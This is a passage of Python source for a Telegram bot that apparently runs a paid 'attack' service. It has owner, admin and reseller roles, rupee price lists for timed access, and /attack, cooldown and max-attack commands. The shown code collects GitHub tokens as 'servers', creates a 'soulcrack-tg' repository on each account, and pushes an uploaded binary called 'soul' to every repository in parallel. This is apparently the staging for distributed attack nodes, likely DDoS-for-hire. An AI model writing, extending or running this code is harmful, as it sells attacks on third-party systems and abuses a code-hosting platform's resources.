        await update.message.reply_text(f"✅ USER ADDED\nUser ID: {new_user_id}\nDuration: {days} days\nAdded by: {user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or days")

async def approveuserslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nThis command is for admins only.")
        return
    if not pending_users:
        await update.message.reply_text("📭 No pending requests")
        return
    pending_list = "⏳ PENDING REQUESTS\n"
    for user in pending_users:
        pending_list += f"• {user['user_id']} - @{user['username']}\n"
    pending_list += f"\nTo approve: /add <id> <days>"
    await update.message.reply_text(pending_list)

async def ownerlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nThis command is for admins only.")
        return
    owners_list = "👑 OWNERS LIST\n"
    for owner_id, owner_info in owners.items():
        username = owner_info.get('username', f'owner_{owner_id}')
        is_primary = owner_info.get('is_primary', False)
        added_by = owner_info.get('added_by', 'system')
        owners_list += f"• {owner_id} - @{username}"
        if is_primary:
            owners_list += " 👑 (PRIMARY)"
        owners_list += f"\n  Added by: {added_by}\n"
    await update.message.reply_text(owners_list)

async def adminlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nThis command is for admins only.")
        return
    if not admins:
        await update.message.reply_text("📭 No admins")
        return
    admins_list = "🛡️ ADMINS LIST\n"
    for admin_id, admin_info in admins.items():
        username = admin_info.get('username', f'admin_{admin_id}')
        admins_list += f"• {admin_id} - @{username}\n"
    await update.message.reply_text(admins_list)

async def resellerlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nThis command is for admins only.")
        return
    if not resellers:
        await update.message.reply_text("📭 No resellers")
        return
    resellers_list = "💰 RESELLERS LIST\n"
    for reseller_id, reseller_info in resellers.items():
        username = reseller_info.get('username', f'reseller_{reseller_id}')
        credits = reseller_info.get('credits', 0)
        expiry = reseller_info.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                expiry = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
            except:
                pass
        resellers_list += f"• {reseller_id} - @{username}\n  Credits: {credits} | Expiry: {expiry}\n"
    await update.message.reply_text(resellers_list)

async def pricelist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💰 PRICE LIST\n• 1 day - ₹120\n• 2 days - ₹240\n• 3 days - ₹360\n• 4 days - ₹450\n• 7 days - ₹650\n\nContact admin for access")

async def resellerpricelist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💰 RESELLER PRICE LIST\n• 1 day - ₹150\n• 2 days - ₹250\n• 3 days - ₹300\n• 4 days - ₹400\n• 7 days - ₹550\n\nContact owner for reseller access")

async def listgrp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nThis command is for admins only.")
        return
    if not groups:
        await update.message.reply_text("📭 No groups")
        return
    groups_list = "👥 GROUPS LIST\n"
    for group_id, group_info in groups.items():
        groups_list += f"• {group_id} - {group_info.get('name', 'UNKNOWN')}\n"
    await update.message.reply_text(groups_list)

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can send broadcast.")
        return
    await update.message.reply_text("📢 BROADCAST MESSAGE\nPlease send the message you want to broadcast:")
    return WAITING_FOR_BROADCAST

async def broadcast_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ Permission denied")
        return ConversationHandler.END
    message = update.message.text
    await send_broadcast(update, context, message)
    return ConversationHandler.END

async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, message: str):
    all_users = set()
    for user_id in approved_users.keys():
        all_users.add(int(user_id))
    for user_id in resellers.keys():
        all_users.add(int(user_id))
    for user_id in admins.keys():
        all_users.add(int(user_id))
    for user_id in owners.keys():
        all_users.add(int(user_id))
    total_users = len(all_users)
    success_count = 0
    fail_count = 0
    progress_msg = await update.message.reply_text(f"📢 SENDING BROADCAST...\nTotal users: {total_users}")
    for user_id in all_users:
        try:
            await context.bot.send_message(chat_id=user_id, text=f"📢 BROADCAST\n{message}")
            success_count += 1
            time.sleep(0.1)
        except:
            fail_count += 1
    await progress_msg.edit_text(f"✅ BROADCAST COMPLETED\n• ✅ Successful: {success_count}\n• ❌ Failed: {fail_count}\n• 📊 Total: {total_users}\n• 📝 Message: {message[:50]}...")

async def addowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_primary_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly primary owners can add owners.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("👑 ADD OWNER\nPlease send the user ID and username to add as owner:\n\nUsage: /addowner <user_id> <username>\nExample: /addowner 12345678 johndoe")
        return
    try:
        new_owner_id = int(context.args[0])
        username = context.args[1]
        if str(new_owner_id) in owners:
            await update.message.reply_text("❌ This user is already an owner")
            return
        owners[str(new_owner_id)] = {
            "username": username,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_primary": False
        }
        save_owners(owners)
        if str(new_owner_id) in admins:
            del admins[str(new_owner_id)]
            save_admins(admins)
        if str(new_owner_id) in resellers:
            del resellers[str(new_owner_id)]
            save_resellers(resellers)
        try:
            await context.bot.send_message(chat_id=new_owner_id, text="👑 CONGRATULATIONS!\nYou have been added as an owner of the bot!\nYou now have full access to all admin features.")
        except:
            pass
        await update.message.reply_text(f"✅ OWNER ADDED\nOwner ID: {new_owner_id}\nUsername: @{username}\nAdded by: {user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def deleteowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_primary_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly primary owners can remove owners.")
        return
    if len(context.args) < 1:
        await update.message.reply_text("🗑️ REMOVE OWNER\nUsage: /deleteowner <user_id>\nExample: /deleteowner 12345678")
        return
    try:
        owner_to_remove = int(context.args[0])
        if str(owner_to_remove) not in owners:
            await update.message.reply_text("❌ This user is not an owner")
            return
        if owners[str(owner_to_remove)].get("is_primary", False):
            await update.message.reply_text("❌ Cannot remove primary owner")
            return
        removed_username = owners[str(owner_to_remove)].get("username", "")
        del owners[str(owner_to_remove)]
        save_owners(owners)
        try:
            await context.bot.send_message(chat_id=owner_to_remove, text="⚠️ NOTIFICATION\nYour owner access has been revoked from the bot.")
        except:
            pass
        await update.message.reply_text(f"✅ OWNER REMOVED\nOwner ID: {owner_to_remove}\nUsername: @{removed_username}\nRemoved by: {user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def addreseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can add resellers.")
        return
    if len(context.args) < 3:
        await update.message.reply_text("💰 ADD RESELLER\nUsage: /addreseller <user_id> <credits> <username>\nExample: /addreseller 12345678 100 johndoe")
        return
    try:
        reseller_id = int(context.args[0])
        credits = int(context.args[1])
        username = context.args[2]
        if str(reseller_id) in resellers:
            await update.message.reply_text("❌ This user is already a reseller")
            return
        resellers[str(reseller_id)] = {
            "username": username,
            "credits": credits,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": "LIFETIME",
            "total_added": 0
        }
        save_resellers(resellers)
        try:
            await context.bot.send_message(chat_id=reseller_id, text=f"💰 CONGRATULATIONS!\nYou have been added as a reseller!\nInitial credits: {credits}\n\nYou can now add users using /add command.")
        except:
            pass
        await update.message.reply_text(f"✅ RESELLER ADDED\nReseller ID: {reseller_id}\nUsername: @{username}\nCredits: {credits}\nAdded by: {user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or credits")

async def removereseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can remove resellers.")
        return
    if len(context.args) < 1:
        await update.message.reply_text("🗑️ REMOVE RESELLER\nUsage: /removereseller <user_id>\nExample: /removereseller 12345678")
        return
    try:
        reseller_to_remove = int(context.args[0])
        if str(reseller_to_remove) not in resellers:
            await update.message.reply_text("❌ This user is not a reseller")
            return
        removed_username = resellers[str(reseller_to_remove)].get("username", "")
        del resellers[str(reseller_to_remove)]
        save_resellers(resellers)
        try:
            await context.bot.send_message(chat_id=reseller_to_remove, text="⚠️ NOTIFICATION\nYour reseller access has been revoked from the bot.")
        except:
            pass
        await update.message.reply_text(f"✅ RESELLER REMOVED\nReseller ID: {reseller_to_remove}\nUsername: @{removed_username}\nRemoved by: {user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def addtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can add tokens.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /addtoken <github_token>")
        return
    token = context.args[0]
    repo_name = "soulcrack-tg"
    try:
        for existing_token in github_tokens:
            if existing_token['token'] == token:
                await update.message.reply_text("❌ Token already exists.")
                return
        g = Github(token)
        user = g.get_user()
        username = user.login
        repo, created = create_repository(token, repo_name)
        new_token_data = {
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
            'status': 'active'
        }
        github_tokens.append(new_token_data)
        save_github_tokens(github_tokens)
        if created:
            message = f"✅ NEW REPO CREATED & TOKEN ADDED!\nUsername: {username}\nRepo: {repo_name}\nTotal servers: {len(github_tokens)}"
        else:
            message = f"✅ TOKEN ADDED TO EXISTING REPO!\nUsername: {username}\nRepo: {repo_name}\nTotal servers: {len(github_tokens)}"
        await update.message.reply_text(message)
    except Exception as e:
        await update.message.reply_text(f"❌ ERROR\n{str(e)}\nPlease check the token.")

async def tokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can view tokens.")
        return
    if not github_tokens:
        await update.message.reply_text("📭 No tokens added yet.")
        return
    tokens_list = "🔑 SERVERS LIST:\n"
    for i, token_data in enumerate(github_tokens, 1):
        tokens_list += f"{i}. 👤 {token_data['username']}\n   📁 {token_data['repo']}\n\n"
    tokens_list += f"📊 Total servers: {len(github_tokens)}"
    await update.message.reply_text(tokens_list)

async def removetoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can remove tokens.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /removetoken <number>")
        return
    try:
        token_num = int(context.args[0])
        if token_num < 1 or token_num > len(github_tokens):
            await update.message.reply_text(f"❌ Invalid number. Use 1-{len(github_tokens)}")
            return
        removed_token = github_tokens.pop(token_num - 1)
        save_github_tokens(github_tokens)
        await update.message.reply_text(f"✅ SERVER REMOVED!\nServer: {removed_token['username']}\nRepo: {removed_token['repo']}\nRemaining: {len(github_tokens)}")
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

async def binary_upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can upload binary.")
        return ConversationHandler.END
    if not github_tokens:
        await update.message.reply_text("❌ NO SERVERS AVAILABLE\nNo servers added. Use /addtoken first.")
        return ConversationHandler.END
    await update.message.reply_text("📤 BINARY UPLOAD\nPlease send me your binary file...\nIt will be uploaded to all github repos as 'soul' file.")
    return WAITING_FOR_BINARY

async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ Permission denied")
        return ConversationHandler.END
    if not update.message.document:
        await update.message.reply_text("❌ Please send a file, not text.")
        return WAITING_FOR_BINARY
    progress_msg = await update.message.reply_text("📥 DOWNLOADING YOUR BINARY FILE...")
    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)
        with open(file_path, 'rb') as f:
            binary_content = f.read()
        file_size = len(binary_content)
        await progress_msg.edit_text(f"📊 FILE DOWNLOADED: {file_size} bytes\n📤 Uploading to all github repos...")
        success_count = 0
        fail_count = 0
        results = []
        def upload_to_repo(token_data):
            try:
                g = Github(token_data['token'])
                repo = g.get_repo(token_data['repo'])
                try:
                    existing_file = repo.get_contents(BINARY_FILE_NAME)
                    repo.update_file(BINARY_FILE_NAME, "Update binary file", binary_content, existing_file.sha, branch="main")
                    results.append((token_data['username'], True, "Updated"))
                except Exception as e:
                    repo.create_file(BINARY_FILE_NAME, "Upload binary file", binary_content, branch="main")
                    results.append((token_data['username'], True, "Created"))
            except Exception as e:
                results.append((token_data['username'], False, str(e)))
        threads = []
        for token_data in github_tokens:
            thread = threading.Thread(target=upload_to_repo, args=(token_data,))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        for username, success, status in results:
            if success:
                success_count += 1
            else:
                fail_count += 1
        os.remove(file_path)
        message = f"✅ BINARY UPLOAD COMPLETED!\n📊 RESULTS:\n• ✅ Successful: {success_count}\n• ❌ Failed: {fail_count}\n• 📊 Total: {len(github_tokens)}\n\n📁 FILE: {BINARY_FILE_NAME}\n📦 FILE SIZE: {file_size} bytes\n⚙️ BINARY READY: ✅"
        await progress_msg.edit_text(message)
    except Exception as e:
        await progress_msg.edit_text(f"❌ ERROR\n{str(e)}")
    return ConversationHandler.END

async def cancel_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ BINARY UPLOAD CANCELLED")
    return ConversationHandler.END

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message and update.message.text and update.message.text.startswith('/'):
        return
    pass

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    conv_handler_binary = ConversationHandler(
        entry_points=[CommandHandler('binary_upload', binary_upload_command)],
        states={
            WAITING_FOR_BINARY: [
                MessageHandler(filters.Document.ALL, handle_binary_file),
                CommandHandler('cancel', cancel_upload)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_upload)]
    )
    conv_handler_broadcast = ConversationHandler(
        entry_points=[CommandHandler('broadcast', broadcast_command)],
        states={
            WAITING_FOR_BROADCAST: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_message_handler),
                CommandHandler('cancel', cancel_upload)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_upload)]
    )
    application.add_handler(conv_handler_binary)
    application.add_handler(conv_handler_broadcast)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("myaccess", myaccess_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("remove", remove_command))
    application.add_handler(CommandHandler("userslist", userslist_command))
    application.add_handler(CommandHandler("approveuserslist", approveuserslist_command))
    application.add_handler(CommandHandler("ownerlist", ownerlist_command))
    application.add_handler(CommandHandler("adminlist", adminlist_command))
    application.add_handler(CommandHandler("resellerlist", resellerlist_command))
    application.add_handler(CommandHandler("pricelist", pricelist_command))
    application.add_handler(CommandHandler("resellerpricelist", resellerpricelist_command))
    application.add_handler(CommandHandler("listgrp", listgrp_command))
    application.add_handler(CommandHandler("maintenance", maintenance_command))
    application.add_handler(CommandHandler("setcooldown", setcooldown_command))
    application.add_handler(CommandHandler("setmaxattack", setmaxattack_command))
    application.add_handler(CommandHandler("gentrailkey", gentrailkey_command))
    application.add_handler(CommandHandler("removexpiredtoken", removexpiredtoken_command))
    application.add_handler(CommandHandler("addowner", addowner_command))
    application.add_handler(CommandHandler("deleteowner", deleteowner_command))
    application.add_handler(CommandHandler("addreseller", addreseller_command))
    application.add_handler(CommandHandler("removereseller", removereseller_command))
    application.add_handler(CommandHandler("addtoken", addtoken_command))
    application.add_handler(CommandHandler("tokens", tokens_command))
    application.add_handler(CommandHandler("removetoken", removetoken_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🤖 THE BOT IS RUNNING...")
    print(f"👑 Primary owners: {[uid for uid, info in owners.items() if info.get('is_primary', False)]}")
    print(f"👑 Secondary owners: {[uid for uid, info in owners.items() if not info.get('is_primary', False)]}")
    print(f"📊 Approved users: {len(approved_users)}")
    print(f"💰 Resellers: {len(resellers)}")
    print(f"🔑 Servers: {len(github_tokens)}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
    print(f"🎯 Max attacks: {MAX_ATTACKS}")
    application.run_polling()

if __name__ == '__main__':
    main()
    
